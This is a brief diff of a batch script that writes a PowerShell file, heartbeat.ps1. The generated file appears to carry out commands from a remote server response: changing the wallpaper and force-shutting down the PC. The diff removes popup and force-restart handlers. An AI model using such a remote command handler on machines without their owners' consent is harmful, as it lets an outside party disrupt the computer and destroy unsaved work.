@@ -36,12 +36,7 @@ echo                     Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -N
 echo                     Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value 0 >> heartbeat.ps1
 echo                     $spi::SystemParametersInfo(20, 0, $tempPath, 3) >> heartbeat.ps1
 echo                 } >> heartbeat.ps1
-echo                 "show_popup" { >> heartbeat.ps1
-echo                     Add-Type -AssemblyName System.Windows.Forms >> heartbeat.ps1
-echo                     [System.Windows.Forms.MessageBox]::Show($response.value, "Message", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) >> heartbeat.ps1
-echo                 } >> heartbeat.ps1
 echo                 "stop_pc" { Stop-Computer -Force } >> heartbeat.ps1
-echo                 "restart_pc" { Restart-Computer -Force } >> heartbeat.ps1
 echo             } >> heartbeat.ps1
 echo         } >> heartbeat.ps1
 echo     } catch { >> heartbeat.ps1
